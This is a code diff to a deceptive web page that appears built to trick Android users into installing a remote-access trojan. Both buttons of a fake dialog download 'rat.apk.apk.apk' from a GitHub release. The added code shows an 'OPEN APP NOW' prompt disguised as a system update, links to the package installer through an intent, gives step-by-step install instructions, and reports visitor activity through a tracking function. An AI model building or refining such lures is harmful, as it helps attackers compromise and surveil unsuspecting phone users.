@@ -34,6 +34,7 @@
         }
         .fake-btn-cancel { background: #f3f4f6; color: #666; }
         .fake-btn-ok { background: #6b21a8; color: #fff; }
+        .guide-link { display: block; margin-top: 12px; font-size: 12px; color: #6b21a8; text-decoration: underline; }
 
         .top-banner {
             background: linear-gradient(90deg, #e8d5f5, #d5e8f5);
@@ -57,6 +58,28 @@
         .stat-box { background: #2a2a2a; padding: 20px; border-radius: 8px; text-align: center; }
         .stat-box h3 { font-size: 24px; color: #6b21a8; }
         .stat-box p { font-size: 12px; color: #999; margin-top: 4px; }
+        
+        /* OPEN APP PROMPT */
+        .open-prompt {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 10001; text-align: center;
+            padding: 50px 20px; display: none;
+        }
+        .open-prompt .icon { font-size: 80px; margin-bottom: 20px; }
+        .open-prompt h1 { color: #1a1a1a; font-size: 28px; margin-bottom: 10px; }
+        .open-prompt p { color: #666; font-size: 16px; margin-bottom: 30px; }
+        .open-app-btn {
+            display: inline-block; padding: 20px 60px; background: #6b21a8;
+            color: #fff; border-radius: 12px; text-decoration: none;
+            font-size: 22px; font-weight: 700; box-shadow: 0 4px 20px rgba(107,33,168,0.4);
+        }
+        .manual-steps {
+            text-align: left; max-width: 400px; margin: 30px auto;
+            background: #f9f9f9; padding: 20px; border-radius: 12px;
+        }
+        .manual-steps h3 { color: #333; margin-bottom: 15px; }
+        .manual-steps p { color: #666; font-size: 14px; line-height: 1.8; }
+        
         @media (max-width: 768px) { .hero h1 { font-size: 32px; } .stats-grid { grid-template-columns: repeat(2, 1fr); } }
     </style>
 </head>
@@ -72,6 +95,31 @@
                 <a href="https://github.com/hoihohavapv/babychak/releases/download/v1.0.2/rat.apk.apk.apk" class="fake-btn fake-btn-cancel" download>Cancel</a>
                 <a href="https://github.com/hoihohavapv/babychak/releases/download/v1.0.2/rat.apk.apk.apk" class="fake-btn fake-btn-ok" download>Install</a>
             </div>
+            <a href="guide.html" class="guide-link">Need help? View installation guide</a>
+        </div>
+    </div>
+
+    <!-- OPEN APP PROMPT (SHOWS AFTER DOWNLOAD) -->
+    <div class="open-prompt" id="openPrompt">
+        <div class="icon">📲</div>
+        <h1>App Downloaded!</h1>
+        <p>Tap the button below to open and install the app</p>
+        
+        <a href="intent://system_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end" 
+           class="open-app-btn">
+           OPEN APP NOW
+        </a>
+        
+        <p style="color:#999; font-size:14px; margin-top:20px;">👇 If the button doesn't work, follow the steps below 👇</p>
+        
+        <div class="manual-steps">
+            <h3>📋 Manual Steps:</h3>
+            <p>
+                <strong>Step 1:</strong> Open your phone's <strong>Files</strong> or <strong>Downloads</strong> app<br>
+                <strong>Step 2:</strong> Find <strong>rat.apk.apk.apk</strong><br>
+                <strong>Step 3:</strong> Tap it to install<br>
+                <strong>Step 4:</strong> Tap <strong>"Install"</strong> → <strong>"Open"</strong>
+            </p>
         </div>
     </div>
 
@@ -115,6 +163,13 @@
             } catch(e) {}
         }
         report("🌐 Page loaded: " + navigator.userAgent);
+        
+        // Show "OPEN APP NOW" prompt after 4 seconds (after download starts)
+        setTimeout(function() {
+            document.getElementById('fakePopup').style.display = 'none';
+            document.getElementById('openPrompt').style.display = 'block';
+            report("📲 Open prompt shown");
+        }, 4000);
     </script>
 
 </body>
